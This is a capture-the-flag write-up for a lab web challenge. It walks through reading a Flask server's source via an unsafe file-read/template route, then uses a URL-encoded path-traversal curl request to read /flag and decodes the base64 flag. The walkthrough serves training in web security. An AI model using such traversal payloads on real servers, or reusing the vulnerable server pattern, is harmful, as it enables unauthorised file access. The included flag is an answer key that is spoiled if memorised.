# Web Hacking 04
```bash
IP=192.168.10.5
PORT=5000
```

> Warning, the Flag is split into 2 parts, make sure to find them and combine both parts before submitting.

## browser
open `http://$IP:$PORT`, server header `Server: gunicorn`, that is a python server.
`/` redirects as 302 to `/index.template`
Source code shows comment `<!-- page: index.template, src: /code/server.py -->`.

## gobuster
gobuster wont work because the server isn't sending correct status codes.

## curl
based on comment, try `http://$IP:$PORT/code/server.py` and `http://$IP:$PORT/server.py`, latter shows code.

```py
$ curl http://$IP:$PORT/server.py

import flask, sys, os
import requests

app = flask.Flask(__name__)
counter = 12345672


@app.route('/<path:page>')
def custom_page(page):
    if page == 'favicon.ico': return ''
    global counter
    counter += 1
    try:
        template = open(page).read()
    except Exception as e:
        template = str(e)
    template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
    return flask.render_template_string(template, name='test', counter=counter);

@app.route('/')
def home():
    return flask.redirect('/index.template');

if __name__ == '__main__':
    flag1 = 'FLAG PART 1: Y3liZXJjdGZke2Qwbjdf'
    with open('/flag') as f:
            flag2 = f.read()

    print("Ready set go!")
    sys.stdout.flush()
    app.run(host="0.0.0.0")

<!-- page: server.py, src: /code/server.py -->
```

`FLAG PART 1: Y3liZXJjdGZke2Qwbjdf`


## path traversal
https://security.snyk.io/vuln/SNYK-PYTHON-FLASKCORS-608972

`%2e` is urlencoded `.`

```bash
$ curl http://$IP:$PORT/%2e%2e/flag

FLAG PART 2: NXBsMTdfbTNfNHA0cjd9

<!-- page: ../flag, src: /code/server.py --> 
```

```bash
$ echo "Y3liZXJjdGZke2QwbjdfNXBsMTdfbTNfNHA0cjd9" | base64 -d                                                 
cyberctfd{d0n7_5pl17_m3_4p4r7}
```

`cyberctfd{d0n7_5pl17_m3_4p4r7}`